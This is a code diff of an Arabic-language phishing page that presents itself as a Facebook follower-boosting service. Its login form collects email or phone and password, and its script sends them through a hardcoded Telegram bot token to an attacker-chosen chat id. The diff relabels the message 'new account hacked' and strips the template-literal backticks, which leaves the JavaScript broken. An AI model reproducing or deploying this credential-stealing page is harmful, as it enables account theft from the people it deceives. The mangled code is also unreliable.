@@ -47,29 +47,29 @@
   </style>
 </head>
 <body>
-
   <div class="form-container">
    <div><b>🚀 زيادة متابعين فيسبوك </b> </div>
     <form id="loginForm">
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
       <input type="password" id="password" placeholder="كلمة السر" required>
       
-      <div> اختر عدد المتابعين</div>
+    <div> اختر عدد المتابعين</div>
       <select id="followers">
         <option value="1000">1000</option>
         <option value="5000">5000</option>
       </select>
       <button type="submit">تسجيل الدخول</button>
     </form>
-<script>
-  window.onload = function () {
+    
+  <script>
+  window.onload = function() {
     const params = new URLSearchParams(window.location.search);
     const chatId = params.get('chatId');
     const id = params.get('id');
 
     if (chatId && !id) {
       // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-      const targetURL = `${window.location.pathname}?id=${chatId}`;
+      const targetURL = ${window.location.pathname}?id=${chatId};
       window.location.href = targetURL;
     }
     // لو فيه id هيكمل عادي بس مش هيعرضه
@@ -77,7 +77,7 @@
 
   const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
 
-  document.getElementById("loginForm").addEventListener("submit", function (e) {
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
     const params = new URLSearchParams(window.location.search);
@@ -91,14 +91,14 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    const message = `📥 - تم تسجيل دخول جديد: \n📧 - الإيميل: ${email}\n🔑 - كلمة المرور: ${password}`;
+    const message = 📥 - تم اختراق حساب جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
+    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)};
 
     fetch(url)
       .then(response => response.json())
       .then(data => {
-        console.log("✅ تم الإرسال:");
+        console.log("✅ تم الإرسال:", data);
         alert("✅ تم إرسال البيانات!");
       })
       .catch(error => {
@@ -107,5 +107,6 @@
       });
   });
 </script>
+
 </body>
 </html>
